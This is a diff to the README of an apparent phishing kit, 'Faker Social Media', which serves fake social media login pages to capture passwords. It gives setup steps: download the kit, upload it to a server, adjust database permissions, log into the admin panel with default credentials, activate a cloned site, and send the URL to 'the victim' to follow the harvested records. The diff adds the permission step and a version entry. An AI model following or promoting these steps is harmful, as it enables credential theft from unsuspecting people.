@@ -13,9 +13,10 @@ You send the internet url to the victim whose password you want to get. After en
 
 1-) Download link on link below <br/> [Download Faker Social Media](http://app.berkekurnaz.com/faker01.zip) <br/>`app.berkekurnaz.com/faker01.zip` <br/>
 2-) Upload the downloaded file to your server <br/>
-3-) Go to `www.yoursite.com/Panel/Login` and log in by typing `admin` as the user name, `1111` in the password. <br/> 
-4-) Activate the social media of your choice. <br/>
-5-) Send the url to the victim. Then you can follow the records here.
+3-) Change the permission of the myDatabase file. Do as application pool group in the hosting panel. <br/>
+4-) Go to `www.yoursite.com/Panel/Login` and log in by typing `admin` as the user name, `1111` in the password. <br/> 
+5-) Activate the social media of your choice. <br/>
+6-) Send the url to the victim. Then you can follow the records here.
 
 #### * Important Note
 The username and password come with an automatic value. Please change your username and password for security
@@ -39,6 +40,7 @@ Tumblr | `www.yoursite.com/tumblr` | **Yes** | **Test Version**
 Version Name | Download Link | Publish Date
 --- | --- | --- 
 Version 1.0 | `www.berkekurnaz.com/faker/01.zip` | 07/02/2019
+Version 1.1 | `www.berkekurnaz.com/faker/01.zip` | 08/15/2019
 
 
 ## Developers
